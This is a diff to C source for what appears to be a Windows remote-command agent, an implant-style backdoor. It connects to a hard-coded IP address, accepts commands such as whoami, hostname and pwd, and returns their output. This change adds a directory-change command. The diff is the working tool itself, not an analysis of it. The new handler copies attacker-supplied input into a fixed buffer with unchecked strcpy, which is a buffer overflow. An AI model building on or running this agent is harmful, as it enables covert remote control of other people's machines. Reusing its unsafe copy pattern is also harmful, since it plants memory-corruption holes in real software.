@@ -3,6 +3,8 @@
 #include <ws2tcpip.h>
 #include <winbase.h>
 #include <errhandlingapi.h>
+#include <tchar.h>
+
 #pragma comment(lib, "ws2_32.lib")
 
 #define IP "192.168.1.33"
@@ -12,6 +14,7 @@ char *executing(char *receive, char *arg);
 char *whoamiCommand();
 char *hostnameCommand();
 char *pwdCommand();
+char *cdCommand(char *directory);
 
 int main() {
     puts("Hello ASX");
@@ -81,7 +84,7 @@ int main() {
         if (content_length_arg == NULL)
             task = executing(command, NULL);
         else
-            task = executing(command, NULL);
+            task = executing(command, arg);
 
         sprintf(response, "%s\r\n", task);
 
@@ -109,7 +112,9 @@ char *executing(char *receive, char *arg) {
         task = hostnameCommand();
     else if (strcmp(receive, "pwd") == 0)
         task = pwdCommand();
-    else
+    else if (strcmp(receive, "cd") == 0) {
+        task = cdCommand(arg);
+    } else
         task = "Not yet build";
     return task;
 }
@@ -138,4 +143,20 @@ char *pwdCommand() {
     if (GetCurrentDirectoryA(1024, pwd) < 0)
         GetLastError();
     return pwd;
+}
+
+char *cdCommand(char *directory) {
+    TCHAR Buffer[1024];
+    strcpy(Buffer, _T(directory));
+    if (!SetCurrentDirectory(Buffer)) {
+        DWORD error = GetLastError();
+        if (error == ERROR_INVALID_PARAMETER) {
+            fprintf(stderr, "Error changing directory: Invalid parameter\n");
+        } else {
+            fprintf(stderr, "Error changing directory: %lu\n", error);
+        }
+        return NULL;
+    }
+    return directory;
+
 }
